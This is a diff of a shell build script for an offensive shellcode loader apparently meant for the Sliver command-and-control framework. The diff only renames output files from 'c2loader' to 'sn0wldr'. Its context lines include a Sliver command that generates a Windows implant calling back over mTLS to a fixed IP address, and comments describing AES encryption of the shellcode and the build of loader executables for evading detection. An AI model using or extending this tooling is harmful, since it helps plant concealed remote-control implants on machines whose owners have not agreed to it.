@@ -4,11 +4,11 @@
 ## Using AES for shellcode encryption and decryption
 
 ### To Generate a Sliver implant shellcode without obfuscation:
-# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/c2loader/input/
+# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/sn0wldr/input/
 # [*] Generating new windows/amd64 implant binary
 # [!] Symbol obfuscation is disabled
 # [*] Build completed in 00:01:25
-# [*] Implant saved to /root/Codes/c2loader/input/sliver.bin
+# [*] Implant saved to /root/Codes/sn0wldr/input/sliver.bin
 #
 ### Move the sliver.bin to folder input if required, then run the autogen script.
 
@@ -116,8 +116,8 @@ mkdir output
 ### Above are required parameters
 
 rawscfilename_enc=$rawscfilename'.enc'
-final_cs_filename='c2loader_'$syscalltype'_'$c2type'.cs'
-final_exe_filename='c2loader_'$syscalltype'_'$c2type'_'$arch'.exe'
+final_cs_filename='sn0wldr_'$syscalltype'_'$c2type'.cs'
+final_exe_filename='sn0wldr_'$syscalltype'_'$c2type'_'$arch'.exe'
 
 sleep 2
 
